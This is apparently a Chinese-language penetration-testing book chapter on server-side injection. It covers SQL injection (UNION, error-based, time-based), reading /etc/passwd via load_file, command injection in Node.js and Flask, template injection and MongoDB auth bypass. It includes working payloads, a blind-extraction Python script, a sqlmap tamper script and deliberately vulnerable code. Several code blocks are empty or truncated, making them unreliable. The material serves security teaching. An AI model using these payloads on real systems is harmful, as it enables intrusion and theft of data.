# 第 3 章 服务器端注入攻击简介

## 3.1 服务器端注入攻击概述

现代应用程序的一个关键方面是能够与输入交互，并根据用户输入执行操作。这些输入通常由应用程序的服务器端处理，它们可以影响数据库查询、控制应用程序逻辑或决定要显示的内容。换句话说，这涉及应用程序不同层（前端、后端、数据库）之间的复杂交互。然而，这个过程带来了重大的安全风险，如果用户输入未经过适当的验证和清理，可能会使应用程序暴露于广泛的漏洞中。

根据处理输入所涉及的层，可能会出现各种漏洞。例如，如果后端层中用户提供的输入被用于执行与系统命令交互的函数而未经过适当验证，则可能导致远程命令执行。同样，在数据库层，未经处理的输入可能导致 SQL 注入漏洞。在前端，不充分的验证可能使应用程序面临客户端注入攻击。因此，这些问题可以广义地归类为输入验证漏洞。

在本章中，我们的主要焦点将是服务器端注入攻击，特别关注“SQL 注入”。我们还将深入探讨“模板注入”和“远程命令执行”的各种技术。同样，我们将研究 NoSQL 数据库及其相关漏洞。

## 3.2 SQL 注入简介

应用程序与后端数据库交互以执行各种操作，例如访问、检索和删除记录。SQL（结构化查询语言）是应用程序与后端数据库通信的方式。当用户执行搜索操作或任何其他查询时，应用程序获取输入并通过 SQL 查询处理它。如果用户提供的输入未经适当清理而直接嵌入到 SQL 查询中，则可能导致 SQL 注入。

SQL 注入漏洞自 20 世纪 90 年代末就已为人所知。尽管开发了旨在防止原始 SQL 查询未经检查即执行的强大框架，但 SQL 注入在许多应用程序中仍然是一个常见问题。这种持续性可归因于多种原因。开发人员可能误用或绕过框架的保护功能，或者漏洞可能源于未充分更新或加固的遗留代码。

在本节中，我们将探讨各种 SQL 注入技术，主要关注 MySQL 数据库，因为其广泛存在和流行。但我们也会包含其他数据库的示例。

### 3.2.1 SQL 注入的分类

SQL 注入涉及检索数据库内容，这取决于所使用的 SQL 注入方法和用于提取数据库的通道。尽管此分类中有多种选择，但它们通常取决于所实现的后端技术。

- **In-band（带内注入）**：此方法使用相同的通信通道进行 SQL 查询注入和数据检索。基于错误和基于 UNION 的提取方法属于此类别。
- **Out-of-band（带外注入）**：在此方法中，通过不同于 SQL 查询注入所使用的通道检索数据。例如，可以通过 HTTP 请求、DNS 查找甚至电子邮件等替代方式提取数据，而不是直接使用数据库通道。
- **Inferential（推断注入）**：在此技术中，攻击者不直接检索数据，而是向数据库发送一系列真/假问题，并根据数据库的响应推断数据。响应可能是网站内容的变化、错误消息或响应所花费的时间。基于布尔和基于时间的 SQL 注入技术属于此类别。

### 3.2.2 SQL 注入技术

通过 SQL 注入可以实现的影响取决于用户输入在 SQL 查询中的位置以及权限，基于此，你可能能够改变逻辑，例如绕过身份验证、检索记录等。

**注意**：虽然 SQL 注入可能发生在 SQL 查询的不同部分，但通常出现在 WHERE 子句中，这是操纵查询逻辑和影响数据检索或修改的关键区域。

#### 3.2.2.1 示例 1：返回所有记录

在此示例中，我们将探讨 SQL 注入导致检索所有记录的场景。假设应用程序使用以下查询实现搜索功能：

**示例**
```sql
SELECT * FROM users WHERE username = '$var'
```
注意：在此查询中，`$var` 代表用户提供的输入。

表面上，此 SQL 查询似乎无害。但是，考虑用户输入 `' OR 1 = 1 --` 的情况。此输入将整个查询转换为：

**查询**
```sql
SELECT * FROM users WHERE username = '' OR 1 = 1 --'
```

**图 3.1 SQL 查询检索所有记录**

此语句返回表中的所有内容，因为 `1=1` 始终为真，而 `--` 将最后的引号转换为注释，使其后的任何内容失效。

**注意**：虽然 SQL 注入可能发生在查询的各个部分，但最常出现在 WHERE 子句中。

#### 3.2.2.2 示例 2：绕过身份验证

让我们探讨如何使用 SQL 注入绕过身份验证。假设应用程序使用以下查询实现登录功能：

**查询**
```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```
注意：在此查询中，`$username` 和 `$password` 代表用户提供的输入。

**图 3.2 通过 SQLi 绕过登录**

考虑提供 payload `' OR 1 = 1 --`，输入将查询转换为：

**查询**
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'pass';
```
由于 `OR '1'='1'` 部分始终为真，实际上将 WHERE 子句转换为真语句，从而匹配 users 表中的所有行。如果应用程序逻辑选择返回数据集中的第一个用户（在本例中为 admin）用于身份验证，则可以利用此缺陷绕过身份验证。

**图 3.3 302 重定向表示登录成功**

虽然给定的 payload 很简单，可能不适用于所有场景，这在很大程度上取决于 SQL 查询的构造，但值得使用这些 payload 的变体对输入参数进行模糊测试。可以自动化此过程的工具是 Wfuzz，它包含默认字典。此工具可用于针对字典模糊测试 username 参数。

**命令**
```bash
wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt -d "username=FUZZ&password=ok&submit=Login" http://127.0.0.1:8080/login.php
```
注意：关键字 `FUZZ` 用于模糊测试参数，在本例中为 `username`。

### 3.2.3 使用 UNION 技术的 SQLi 数据提取

基于 UNION 的 SQL 注入是在数据库中存在 SQL 注入漏洞时用于窃取数据的最常用技术之一。它涉及组合两个 SELECT 语句。然而，要成功执行此技术进行数据提取，必须满足以下条件：

1. 两个 SELECT 语句必须返回相同数量的列。这意味着必须枚举数据库中的总列数，以确保 SELECT 语句正确对齐。
2. 两个 SELECT 语句中定义列的数据类型应始终相同。这确保了来自不同查询的数据可以通过 UNION 操作无缝组合。

为了进一步理解此概念，我们将使用 SQLI-LABS，这是一个包含故意易受攻击的 SQL 注入场景的平台 [https://github.com/Audi-1/sqli-labs]。让我们看一下在 MySQL 5 版本上运行的此易受攻击代码。

**易受攻击的代码**
```php
if(isset($_GET['id']))
{
    $id=$_GET['id'];
    //logging the connection parameters to a file for analysis.
    $fp=fopen('result.txt','a');
    fwrite($fp,'ID:'.$id."\n");
    fclose($fp);
    $sql="SELECT * FROM users WHERE id= '$id' LIMIT 0,1";
    $result=mysql_query($sql);
    $row = mysql_fetch_array($result);
    if($row)
    {
        echo 'Your Login name:'. $row['username'];
        echo 'Your Password:'. $row['password'];
    }
    else
    {
        print_r(mysql_error());
    }
}
else
{
    echo "Please input the ID as parameter with numeric value";
}
```

代码从用户输入中获取 `id` 参数，并将其直接插入到 SQL 查询中，未经任何清理，因此容易受到 SQL 注入攻击。由于注入发生在 SELECT 语句的 WHERE 子句中，我们可以使用 UNION 命令进行数据提取。

**图 3.5 显示 id=1 的用户**

#### 3.2.3.1 测试 SQL 注入

测试 SQL 注入最常见的方法是在易受攻击的参数（在本例中为 `id`）中注入单引号/撇号。

**示例**
```
http://127.0.0.1/sqlilabs/Less-2/?id=1'
```

**图 3.6 SQL 错误消息**

#### 3.2.3.3 SQLMap 提示

为了增强检测，可以利用 SQLMap 中的 `--level` 和 `--risk` 选项。

- `--risk`：此选项允许你指定 SQL 注入测试的风险等级，范围从 1 到 3。默认等级为 1。将等级提高到 2 或 3 会加强测试过程，采用更适合复杂场景的高级注入技术。
- `--level`：此参数设置检测等级，可以是 1 到 5 之间的任何值。在等级 1，SQLMap 执行有限的测试子集。另一方面，等级 5 表示全面的测试方法，使用更多种类的 payload 并测试边界。这包括探测头部、cookie 和其他潜在注入点中的漏洞。虽然等级 5 增加了测试覆盖率和检测概率，但它也会产生更多噪音，从而更易被检测到。

#### 3.2.3.4 SQLMap 提示

如果有多个参数，而你只想测试特定参数，请在 sqlmap 中使用 `-p` 标志来测试特定参数。此外，星号（`*`）也可用于表示 payload 注入点，无论是在命令行中指定还是在 HTTP 请求文件中指定。

**导致错误的查询**

**图 3.8 4—未知列错误**

**无错误的查询**

或者，你也可以使用 `UNION SELECT` 来枚举列数。以下查询使用带有三个 NULL 值的 UNION SELECT 方法来测试表是否具有三列。

**示例**
```
http://127.0.0.1/sqlilabs/Less-2/?id=1+union+select+null,null,null--
```

#### 3.2.3.6 确定易受攻击的列

现在我们知道有三列，我们可以使用 `UNION SELECT` 语句从数据库中提取数据。但在提取数据之前，必须确定哪些列可用于显示数据。这是因为某些列可能由于数据库约束或设计而不适合检索数据。为了确定易受攻击的列，我们将使用以下命令：

**示例**
```
http://127.0.0.1/sqlilabs/Less-2/?id=-1+union+select+1,2,3--
```

请注意，我们在 id 之前使用了负号。这将使原始查询无效，确保作为 SQL 注入结果显示的数据与原始查询返回的任何数据清晰区分。

另一种技术涉及使用假语句。这里的逻辑类似：通过提供逻辑运算符 AND 与 `1=0`（始终为假），我们确保原始查询不会返回任何数据。这种方法更容易识别哪些列能够显示数据。

**示例**
```
http://127.0.0.1/sqlilabs/Less-2/?id=and1=0unionselect1,2,3--
```

**图 3.10 可以使用第 2 列和第 3 列提取数据**

从输出中可以明显看出，第 2 列和第 3 列都能够显示数据。

#### 3.2.3.8 提取数据库信息

要检索更多详细信息，需要识别数据库名称和表，然后从这些表中提取数据。在 MySQL 5 及更高版本中，有一个名为 `information_schema` 的只读数据库，其中包含表名、列名以及所有其他数据库的权限数据。对此信息的访问基于每个 MySQL 用户的权限，这些权限决定了他们可以访问的表。

`information_schema` 包含几个提供关于数据库、表和列信息的表，用于检索数据：

- `information_schema.schemata`：此表包含 MySQL 服务器上所有数据库的列表。
- `information_schema.tables`：此表存储数据库中的表名。
- `information_schema.columns`：此表维护所有数据库中每个表的列名。

#### 3.2.3.9 枚举数据库

现在我们已经对数据库进行了指纹识别，下一步是枚举我们的用户 `tmgm` 可访问的所有数据库。如果用户具有 root 权限，假设我们拥有这些权限，则可以包含所有数据库。由于 `information_schema.schemata` 包含所有数据库的列表，我们将查询它。

**查询**
```sql
SELECT * FROM users WHERE id=-1 union select 1,schema_name,3 from information_schema.schemata-- LIMIT 0,1;
```

此查询旨在从 `schema_name` 列中提取信息，该列列出了所有数据库名称。数据从 `information_schema` 数据库中的 `schemata` 表请求。

## 3.3 SQLMap 提示 1

当识别 SQL 注入漏洞时，最好在 sqlmap 中使用 `dbms` 命令指定数据库类型。这种方法显著减少了 sqlmap 需要发送的查询数量，使检测过程更高效。

### 3.3.1 SQL 注入到 RCE

在某些情况下，SQL 注入还可以允许在 Web 服务器上读写文件。这取决于分配给 MySQL 用户的权限。在这种情况下，可能可以读取 Web 服务器上的本地文件，甚至写入我们的文件，从而导致远程代码执行。

#### 3.3.1.1 检索权限信息

考虑到 MySQL 数据库中 SQL 注入的上下文，我们可以利用 `information_schema.user_privileges` 表来检索有关权限的信息。

**示例**
```
http://127.0.0.1/search.php?search=tmgm'UNION+SELECT+ALL+1,2,group_concat(privilege_type),4+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES--+
```

**图 3.16 输出显示分配给数据库用户的 `FILE` 权限**

截图清楚地显示用户拥有多种权限，包括 `FILE` 权限。具有 FILE 权限的 MySQL 用户可以使用 `LOAD_FILE()` 和 `LOAD DATA INFILE` 等函数检索数据。

#### 3.3.1.2 读取文件

一旦确认了权限，我们可以使用 `LOAD_FILE` 函数尝试读取本地文件，例如 `/etc/passwd`。

**示例**
```
curl "http://127.0.0.1/search.php?search=tmgm'Union+SELECT+ALL+1,2,load_file('/etc/passwd'),4--+"
```

**图 3.17 输出显示 `/etc/passwd` 文件的内容**

我们成功读取了 `/etc/passwd` 文件。如果在读取文件时遇到错误，可以将字符串转换为其十六进制等效值。当反斜杠破坏语法或 WAF 阻止文件名时，此方法很有帮助。在这种情况下，我们可以使用文件的十六进制等效值（例如 `/etc/hostname`）来检索详细信息。

**示例**
```
"http://127.0.0.1/search.php?search=tmgm'Union+SELECT+ALL+1,2,load_file(0x2f6574632f686f73746e616d65),4--+"
```

**图 3.18 输出显示 `/etc/hosts` 的内容**

或者，整个文件内容也可以转换为 base64 或十六进制。这可以使用 `TO_BASE64` 函数实现，在需要带外查询的情况下非常有用。

**示例**
```
http://127.0.0.1/search.php?search=tmgm'Union+SELECT+ALL+1,2,TO_BASE64(load_file(0x2f6574632f686f73746e616d65)),4--+
```

### 3.4.1 基于错误的 SQL 注入

基于错误的 SQL 注入涉及故意触发数据库服务器的错误消息。通过分析这些错误消息，可以推断数据库模式、表名、列名和其他敏感数据。

在我们之前的示例中，我们使用 UNION 语句提取数据，这需要使用 `ORDER BY` 或 `GROUP BY` 子句来提取 SELECT 语句中的列数。

在除 MySQL 错误外没有其他输出的情况下，你可以通过错误强制数据提取。为此，可以使用 MySQL 中的 `ExtractValue` 函数来促进生成。`ExtractValue()` 函数在无法解析提供给它的 XML 数据时会生成错误。这可以包括 SQL 查询的评估结果，该结果嵌入到产生的错误消息中。

为了确保 `ExtractValue()` 函数始终触发错误，我们将传递一个字符（如 `0x7E`，相当于符号 `~`）。这将被视为格式错误的输入，导致数据库生成详细的错误消息。

注意：在 SQL 注入中使用 `ExtractValue()` 函数的此技术不要求目标数据库是 XML 数据库或存储 XML 格式的数据。

让我们看一些查询：

**提取数据库版本**
```sql
' AND extractvalue(1, CONCAT(0x7e, (SELECT version()), 0x7e)); --
```

**提取表名**
```sql
' AND extractvalue(rand(), concat(0x7e, (SELECT concat(0x7e, schema_name) FROM information_schema.schemata LIMIT 0, 1))); --
```

**从 information_schema 提取特定表名**
```sql
' AND extractvalue(rand(), concat(0x3a, (SELECT concat(0x7e, TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_NAME="users" LIMIT 0,1))); --
```

注意：此技术仅在 MySQL 5.1 或更高版本上有效。此外，结合 `LIMIT` 函数可以提取底层数据库的特定数据段，因为它有助于控制查询返回的数据量。

#### 3.4.1.1 SQLMap 提示

为了优化 SQLMap 的 payload 选择，你可以使用 `--technique=E` 等选项缩小技术范围，该选项测试基于错误的 SQL 注入 payload。此外，你可以使用 `--test-filter` 或 `--test-skip` 提高精度，以选择性地针对 payload，简化已知漏洞的测试过程。例如，可以使用 `--test-filter='ORDER BY'` 专注于 `ORDER BY` 相关的测试。

#### 3.4.1.2 SQL 注入前缀/后缀

在某些情况下，查询的构造方式要求在注入我们自己的命令之前添加额外的字符来关闭现有的输入参数。这称为前缀。类似地，后缀可用于确保 SQL 查询正确关闭且不会导致错误。为了解释此概念，让我们看一下易受攻击的代码：

**易受攻击的代码**
```php

```

通过提供传统的 `Order By` 子句，查询会导致语法错误：

**Payload：**
```

```

这将导致查询如下：

**查询**
```sql
SELECT * FROM users WHERE id = ((''. 1'order by 100 -- ')) LIMIT 0,1;
```
由于左括号未正确关闭，将导致 SQL 语法错误。

**图 3.21 SQL 语法错误**

为了克服这个问题，我们将在注入 `Order By` 子句之前关闭两个括号。

**Payload**
```

```

这使得在关闭括号 `))` 之后，查询中的子句变得正确：

**查询**

### 3.4.2 布尔 SQL 注入

### 3.5.1 基于时间的 SQL 注入

在基于布尔的盲 SQL 注入中，我们通常比较真假语句的结果来枚举数据库。但是，想象一种情况，真假语句的结果之间没有明显差异，并且数据库不返回任何错误。这种场景通常被称为完全盲 SQL 注入攻击。

在这种情况下，基于时间的 SQL 注入可能有效。此方法要求数据库执行延迟。如果我们的查询答案为真，数据库响应将延迟指定的持续时间。相反，如果答案为假，则不会有延迟。例如，如果 MySQL 版本为 5，则延迟十秒；否则无延迟。

根据你使用的数据库，有内置函数可用于延迟响应。对于 MySQL 服务器，常用 `SLEEP()` 和 `BENCHMARK()` 函数。对于 MSSQL 服务器，使用 `WAITFOR DELAY`；PostgreSQL 使用 `pg_sleep()` 等。

#### 3.5.1.1 测试基于时间的 SQL 注入

要测试基于时间的 SQL 注入，我们可以使用 MySQL 中的 `IF` 语句。以下是通用语法。

**语法**
```sql
IF(condition, true_statement, false_statement)
```

基于此，我们可以构造一个 payload，如果为真，将触发 `SLEEP()` 函数，从而延迟响应。

**Payload：**
```sql
' OR IF(1=1, SLEEP(5), 0) --
```

当注入此 payload 时，将导致数秒的延迟。在以下截图中，第一个命令导致延迟一秒，而第二个命令导致延迟五秒，具体取决于提供的输入。

**图 3.27 一秒和五秒延迟的输出**

**命令**


**图 3.28 time 命令的输出**

```python
import requests
import urllib.parse

sleep_time = 4
count = 0

    count += 1
    url = f"http://127.0.0.1:8080/index.php?id='+OR+IF(LENGTH((SELECT+DATABASE()))+%3d+{count},+SLEEP(5),+0)%20--%20-"
    r = requests.get(url)
    if int(r.elapsed.total_seconds()) >= sleep_time:
        db_length = count
        print("Database character length is: " + str(db_length))
        break

db_name = ""
for position in range(1, db_length + 1):
    found = False
    for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_#":
        url = f"http://127.0.0.1:8080/index.php?id='OR+IF(ASCII(SUBSTRING((SELECT+DATABASE()),+{position},1))+%3d+ASCII('{char}'),+SLEEP({sleep_time}),+0)+--%20-"
        r = requests.get(url)
        if int(r.elapsed.total_seconds()) == sleep_time:
            db_name += char
            print(f"Character {position}: {char}")
            found = True
            break
    if not found:
        print(f"Character {position} not found. Exiting.")
        break
```

### 3.5.3 二阶 SQL 注入

二阶 SQL 注入发生在输入被注入到应用程序的一个部分，而输出在稍后显示。在此过程中，应用程序在未进行适当验证或清理的情况下检索并使用存储的数据。这种漏洞类型相对难以利用，因为像 SQLMap 这样的自动化工具无法利用它，因为它们不知道 payload 输出的位置。这比传统 SQL 注入更难利用。

原因是像 SQLMap 这样的自动化工具旨在基于即时数据库响应识别 SQL 注入，其中响应位置与注入点相同。然而，对于二阶 SQL 注入，应用程序在后续阶段处理存储的数据。因此，即使自动化工具在后续阶段检测到数据库错误，跟踪原始注入点并将其与不同页面上的响应相关联的能力也需要对应用程序的业务逻辑和数据流有更深入的理解，这使得自动化工具难以识别。

让我们考虑一个涉及 Joomla 版本（CVE-2018-6376）的真实场景，该版本易受二阶 SQL 注入影响，导致权限提升。

#### 3.6.1.2 使用 Tamper 脚本自动化

为每个 payload 手动生成 JWT 令牌的过程可能很繁琐，尤其是在注入复杂的情况下。在这种情况下，我们可以创建一个自定义 tamper 脚本来自动化工作流，并将其与 SQLMap 一起使用以自动化数据库提取过程。

SQLMap 支持创建自定义 tamper 脚本以支持此类场景。这些 tamper 脚本使用 Python 编写，与该工具所使用的语言相同。

以下 tamper 脚本使用 `name` 参数作为注入，并传递 `payload`。`payload` 变量包含 SQLMap 生成的 payload。然后它使用密钥生成 JWT 令牌。

**代码：Tamper 脚本**
```python
import jwt
from datetime import datetime, timedelta
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    # Your secret key
    secret_key = 'secret@123'
    # Payload for the JWT token
    token = {
        'name': "Tmgm " + payload,
        'last_name': 'test',
        'id': '123',
        'exp': datetime.utcnow() + timedelta(hours=1)  # Optional: Set an expiration time
    }
    # Generate the JWT token
    jwt_token = jwt.encode(token, secret_key, algorithm='HS256')
    return jwt_token
```

## 3.7 远程命令执行

在本书中，我们将不时讨论导致远程代码执行（RCE）的各种场景。但是，在本节中，我们将重点介绍用于与操作系统交互的特定函数。如果用户可控输入通过这些函数传递且未正确处理，则可能导致 RCE，尽管这些函数几乎存在于所有编程语言中。在本节中，我们将查看 Node.js 和 Python 的示例，因为它们越来越受欢迎。

### 3.7.1 Node.js 中的 RCE

在 Node.js 中，`child_process` 模块中的 `exec` 和 `spawn` 等函数至关重要。这些函数允许 Node.js 执行系统命令，这对于许多合法目的很有用，例如自动化服务器任务、处理网络操作、管理服务器等。

为了说明，考虑一个场景，其中 node.js 应用程序接受用户提供的输入进行主机名查找。它使用操作系统中的 `whois` 命令以及用户提供的域名。该应用程序使用 Express.js（流行的 Node.js Web 框架）和 `child_process` 模块的 `exec` 函数来执行带有用户输入的 `whois` 命令。

Node.js 在其文档中警告不要通过 `exec` 函数传递不受信任的输入：“永远不要将未经处理的用户输入传递给此函数。任何包含 shell 元字符的输入都可能被用于触发任意命令执行”[https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback]。让我们分析易受攻击的代码：

**易受攻击的代码**
```javascript
const express = require('express');
const { exec } = require('child_process');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.post('/lookup', (req, res) => {
    const domain = req.body.domain;
    if (!domain) return res.status(400).send('Invalid input. Please provide a domain.');
    exec('whois ${domain}', (error, stdout) => {
        if (error) return res.status(500).send('Internal Server Error');
        res.send('<pre>${stdout}</pre>');
    });
});
app.listen(3000);
```

该代码旨在接受域名作为输入并将其存储在 `domain` 变量中。然后，此 `domain` 变量直接附加到 `whois` 命令，并通过 `exec` 函数传递，未经任何清理。成功执行后，它返回 whois 数据；否则，它发送服务器错误响应。以下是正常查找 `redseclabs.com` 的输出示例：

**命令**
```bash
curl -s -k -X 'POST' --data-binary 'domain=redseclabs.com' http://localhost:3000/lookup
```

为了演示漏洞，我们将使用分号（`;`），它在许多 shell 环境中用作命令分隔符。后面跟我们要执行的系统命令，在本例中为 `uname -a`。

**图 3.44 输出显示 redseclabs.com 的 whois 记录**

**命令**
```bash

```

### 3.7.2 Flask 应用程序中的 RCE

与 Node.js 类似，Python 中有几个函数可用于动态执行代码。这包括 `eval()`、`exec()`、`pickle.loads()`、`os.system()`、`os.popen()` 等。如果不受信任的输入通过这些函数传递，则可能导致任意代码执行。

为了说明，考虑一个场景，Flask 应用程序（基于 Python 的 Web 框架）接收用户提供的数学表达式，计算这些表达式并将结果返回给用户。然而，底层代码使用 `eval()` 函数来计算表达式。在 Python 中，`eval()` 接受一个字符串并将其解释为 Python 代码。如果不安全使用，可能会导致任意代码注入。

考虑以下负责计算数学表达式的代码。

**易受攻击的代码**
```python
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html', result=None, error=None)

@app.route('/eval')
def eval_expression():

        result = eval(expression)
        return render_template('index.html', result=result, error=None)
    except Exception as e:
        return render_template('index.html', result=None, error=str(e))

if __name__ == '__main__':

```

## 3.8 服务器端模板注入（SSTI）

在本节中，我们将讨论服务器端模板注入攻击以及如何将其用于攻击现代 Web 应用程序。

### 3.8.1 模板引擎简介

模板引擎在现代 Web 开发中已变得非常流行，因为它们允许开发人员用更少的代码生成更动态的内容。在模板引擎出现之前，开发人员必须直接将 HTML 与服务器端编程语言（如 PHP、ASP 等）混合，这使得代码难以维护。模板引擎将业务逻辑与表示层分离，意味着 HTML/CSS 与服务器端编程代码分开。这种分离使代码更具可读性，增强了可维护性，并提高了代码重用性。以下是 HTML 模板的示例：

**示例：**
```html
<html>
<head>
    <title>{{page_title}}</title>
</head>
<body>
    <h1>{{heading}}</h1>
    <p>{{content}}</p>
</body>
</html>
```

在此模板中，`{{page_title}}`、`{{heading}}` 和 `{{content}}` 是动态内容的占位符。

在服务器端，这些占位符被填充实际内容。例如，在基于 Python Flask 的应用程序中，我们可能有如下内容：

**代码：**
```python
@app.route('/')
def home():
    return render_template('template.html', page_title="Home Page", heading="Welcome to the game", content="This is my home page.")
```

此代码用指定的字符串填充 `page_title`、`heading` 和 `content` 占位符。

#### 3.8.1.1 服务器端模板注入的根本原因

模板引擎具有允许访问内部对象和函数的功能。

当用户提供的输入直接插入到模板中，并由模板引擎解释为代码而不是字符串时，就会发生服务器端模板注入（SSTI）；这种行为可能导致远程代码执行（RCE）。为了利用此漏洞，会注入特制的字符串，这些字符串将被模板引擎解释为命令或指令。

考虑到前面的示例，如果这些动态内容（`page_title`、`heading`、`content`）中的任何一个来自用户输入且未经过适当清理，就会为模板注入留下空间。

虽然有许多模板引擎，但你在野外可能经常遇到的一些著名的模板注入如下：

- Smarty（PHP）
- Blade（PHP，与 Laravel 一起使用）
- Pug（原 Jade，JavaScript）
- Liquid（Ruby，由 Shopify 使用）
- Freemarker（Java）
- Twig（PHP，与 Symfony 一起使用）
- Mustache（跨平台）
- Jinja2（Python）
- Mako（Python）

### 3.8.2 识别模板注入

要识别 SSTI，请使用由模板表达式中常用的特殊字符组成的 Polyglot payload 来模糊测试模板，例如 `${{<%[%'"}}%\`。如果存在漏洞，服务器可能会返回错误消息或引发异常。这是 SSTI 可能存在的迹象之一。

#### 3.8.2.1 模板注入中的上下文

SSTI 可以发生在两个不同的上下文中，每个都需要自己的检测方法。即使初始模糊测试或自动化工具提示存在 SSTI，为了有效利用它，仍然需要识别其上下文。

**纯文本上下文**

在纯文本上下文中，用户输入被视为简单文本；换句话说，它不被视为代码或可执行指令。这意味着你提供的任何输入都将被应用程序反映。例如，如果你提供以下 payload 作为输入：

**示例**
```
https://vulnerablebank.com/?username=Hello {{name}}
```

它可能呈现为“Hello rafay”，其中“rafay”被视为纯文本。此上下文中的 SSTI 不太严重，但如果输入未经过适当转义而反映在网页中，它仍然会带来间接风险，例如 XSS。

此上下文经常与客户端模板注入（CSTI）漏洞混淆，我们将在下一章中研究。但是，重要的是要注意，SSTI 中的执行点在服务器端，而不是 CSTI 中的客户端。

**代码上下文**

在代码上下文中，用户提供的输入直接插入到代码块或语句中，模板注入随后将其解释并执行为代码。在这种情况下，后果可能像 RCE 一样严重。

代码上下文通常通过注入简单的数学表达式（如 `{{7 * 7}}` 或 `{{48 / 6}}`）来处理；如果输出呈现计算结果（例如“49”或“8”），则很可能存在代码执行。在后续部分中，我们将查看代码上下文中的示例。

#### 3.8.2.2 识别模板引擎

一旦识别出模板注入，下一步就是识别底层使用的模板引擎。此步骤涉及提交无效语法，这可能导致模板引擎出现故障并通过错误消息暴露自身。但是，当服务器端禁用错误消息时，此技术可能无效。

在这种情况下，我们可以使用其他方法，例如检查应用程序的环境（例如已知的技术栈），或观察其处理模板语法的方式中的其他迹象，这些迹象可能因引擎而异。一种常见的方法是使用来自不同模板引擎的语法注入任意数学运算，并观察它们是否被成功计算。为了帮助此过程，我们可以使用来自 Blackhat 演讲的决策树：“Server-Side Template Injection: RCE for the modern webapp.” [https://blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf]

## 3.10 NoSQL 注入漏洞

NoSQL 数据库已经存在了相当一段时间，但它们最近受欢迎程度的激增与新技术栈（如 MEAN 和 MERN）的广泛采用以及现代 Web 应用程序不断变化的需求密切相关。

NoSQL 数据库旨在处理大量数据并进行水平扩展，使其成为大数据应用程序的理想选择。许多此类数据库利用 JSON 存储数据，与 Node.js、React 和 Angular 等服务器端技术完美契合。这使得数据交互更高效、无缝。

虽然有多种 NoSQL 数据库容易受到注入攻击，但 MongoDB 是这些数据库中部署最广泛的，因此在本节中，我们将重点介绍围绕 MongoDB 的攻击。

### 3.10.1 MongoDB NoSQL 注入利用

NoSQL 注入的根本原因与传统 SQL 注入相同，即将用户提供的输入直接插入数据库查询中，而未经适当的验证或清理。但是，由于 NoSQL 数据库不使用传统的 SQL 语法，并且通常依赖 JSON 或 JavaScript，因此注入技术有所不同。这些技术利用 NoSQL 系统的特定查询结构和能力。让我们通过一个示例来理解：

在 SQL 中，典型的登录语句如下所示：

**示例**
```sql
SELECT * FROM members WHERE username = 'tmgm' AND password = 'tmgm';
```

在 MongoDB 中，等效的登录查询如下所示：

**示例**
```javascript
db.members.find({ "username": "tmgm", "password": "tmgm" });
```

假设开发人员想从数据库中检索记录，如下所示：

**易受攻击的代码**
```javascript
db.collection('members').find({
    username: inputData.username,
    password: inputData.password
});
```

将 `inputData` 直接包含在数据库查询中可能导致注入漏洞。这是因为 MongoDB 对查询条件采用了特定的运算符，如果被攻击者操纵，可以改变查询的预期结果。

#### 3.10.1.1 MongoDB 运算符

MongoDB 注入通常通过使用某些运算符来利用；这些运算符具有不同的用途，可用于改变查询的逻辑。以下是运算符及其解释的列表。

| 运算符   | 解释                                 |
|----------|--------------------------------------|
| `$gt`    | 大于                                 |
| `$lt`    | 小于                                 |
| `$eq`    | 等于                                 |
| `$ne`    | 不等于                               |
| `$regex` | 正则表达式                           |
| `$in`    | 验证所需数据是否存在于数据结构（如数组）中 |
| `$exists`| 确定特定字段的存在                     |

#### 3.10.1.2 使用 NoSQL 注入绕过身份验证

考虑一个在其登录功能中实现了上述易受攻击代码的应用程序。使用无效凭据的传统 HTTP 请求如下所示：

**请求**
```
POST / HTTP/1.1
Host: 127.0.0.1:49090
Content-Length: 29
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36
Connection: close

username=tmgm&password=1234
```

响应返回错误，表明凭据无效。

**图 3.55 响应显示凭据无效**

可以通过构造使用 MongoDB 运算符强制查询条件始终为真的 payload 来绕过身份验证。为此，我们将对 `username` 和 `password` 参数使用 `$gt` 运算符。

**请求**
```
POST / HTTP/1.1
Host: 127.0.0.1:49090
Content-Length: 29
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36
Connection: close

username[$gt]=&password[$gt]=
```

当服务器将参数直接传递给 NoSQL 数据库查询时，此查询可能被解释为：

**示例**
```javascript
db.members.find({ "username": { "$gt": "" }, "password": { "$gt": "" } });
```

该查询要求数据库返回 username 和 password 字段的值大于空字符串的所有用户。由于数据库中的任何用户都会大于空字符串，因此该条件将始终返回 true，从而有效绕过身份验证。

以下截图显示以 `administrator` 用户身份成功登录。这是因为应用程序处理数据库返回的第一条用户记录，并根据该记录授予访问权限，在此场景中，`administrator` 用户恰好是数据库中的第一条记录。

### 3.10.2 NoSQL 注入真实示例

在对一个使用 MongoDB 进行数据库操作的医疗应用程序进行渗透测试期间，我们遇到了多个 NoSQL 注入实例。身份验证依赖于两个基本参数：

- **Patient ID**：此参数包含系统中每位患者的唯一 ID。
- **AuthKey**：AuthKey 用作身份验证的秘密令牌，保护敏感的患者数据。

在评估过程中，我们发现其中一个端点泄露了 `PatientID`。但是，要绕过身份验证，需要 `AuthKey`。这时我们使用了值为 `true` 的 `$exists` 运算符，它强制应用程序评估 `AuthKey` 字段的存在。换句话说，它使语句为真，从而绕过身份验证。

**绕过身份验证的 POC：**
```
www.vulnerableapp.com/api/v1/patients/getMedicalHistory?PatientID=11232241&AuthKey[$exists]=true
```

